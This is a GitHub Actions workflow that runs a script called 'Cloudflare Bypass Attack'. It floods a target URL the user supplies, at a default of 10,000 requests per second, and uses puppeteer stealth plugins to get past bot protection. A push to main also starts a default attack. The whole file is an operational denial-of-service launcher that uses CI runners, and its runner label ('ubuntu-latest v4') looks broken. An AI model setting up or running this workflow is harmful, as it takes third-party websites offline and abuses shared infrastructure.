name: Cloudflare Bypass Attack v4

on:
  workflow_dispatch:
    inputs:
      target:
        description: 'Target URL'
        required: true
        type: string
      time:
        description: 'Attack duration in seconds'
        required: true
        type: number
      rps:
        description: 'Requests per second'
        required: true
        type: number
        default: 10000
      threads:
        description: 'Number of threads'
        required: true
        type: number
        default: 8
  push:
    branches: [ main ]

jobs:
  attack:
    runs-on: ubuntu-latest v4
    
    steps:
    - name: Checkout code v4
      uses: actions/checkout@v4
      
    - name: Setup Node.js v4
      uses: actions/setup-node@v4
      with:
        node-version: '18'
        
    - name: Install dependencies v4
      run: |
        npm install puppeteer-extra puppeteer-extra-plugin-stealth puppeteer-cluster
        
    - name: Run Cloudflare Bypass attack v4
      run: |
        node cf-bypass.js ${{ inputs.target }} ${{ inputs.time }} ${{ inputs.rps }} ${{ inputs.threads }}
      if: ${{ github.event_name == 'workflow_dispatch' }}
      
    - name: Run default attack v4
      run: |
        node cf-bypass.js https://example.com 60 10000 8
      if: ${{ github.event_name != 'workflow_dispatch' }}
